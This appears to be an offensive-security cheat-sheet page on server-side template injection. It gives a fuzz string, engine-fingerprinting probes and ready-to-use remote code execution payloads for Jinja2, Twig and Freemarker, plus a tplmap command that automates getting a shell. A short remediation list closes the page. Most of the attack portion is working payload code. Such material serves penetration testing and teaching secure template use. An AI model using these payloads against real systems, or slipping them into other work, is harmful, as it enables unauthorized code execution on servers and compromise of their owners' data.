---
tags:
  - Web
---

# :material-code-braces: Server-Side Template Injection (SSTI)

<span class="pill pill-hard">→ RCE</span> <span class="pill pill-info">web</span>

When user input is concatenated into a server-side template instead of passed as data, you can inject template syntax — which many engines happily evaluate into code execution.

!!! abstract "TL;DR"
    Fuzz with `${{<%[%'"}}%\`. If a math expression like `{{7*7}}` renders as `49`, you have SSTI — then climb to RCE via the engine's object model.

## :material-magnify: Detect + fingerprint

```text
{{7*7}}     -> 49    Jinja2 / Twig
${7*7}      -> 49    Freemarker / JSP EL
#{7*7}      -> 49    Ruby ERB-ish
{7*7}       -> 49    Smarty / Tornado
```

`{{7*'7'}}` → `7777777` means Jinja2 (Python); `49` means Twig (PHP). This split confirms the engine.

## :material-fire: Jinja2 → RCE

```python
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## :material-fire: Other engines

=== "Twig (PHP)"

    ```twig
    {{ ['id'] | filter('system') }}
    ```

=== "Freemarker (Java)"

    ```text
    <#assign x="freemarker.template.utility.Execute"?new()>${x("id")}
    ```

!!! tip "tplmap"
    `tplmap -u 'http://t/?name=*'` automates detection, engine ID, and shell for most engines.

!!! opsec "You're running code on their box"
    Same footprint as [command injection](command-injection.md) — one OAST check beats spawning shells blindly.

## :material-shield-check: Remediation

- Render templates with a fixed template and pass user input as **context data**, never build the template string from input.
- Use a sandboxed/logic-less engine (e.g. Mustache) where possible.

## :material-link-variant: Related

- Cousin of [Command Injection](command-injection.md); often reached through [XSS](xss.md) sinks.
- RCE → [Linux Privesc](../privesc/linux.md).
- Reference: [PortSwigger SSTI](https://portswigger.net/web-security/server-side-template-injection).
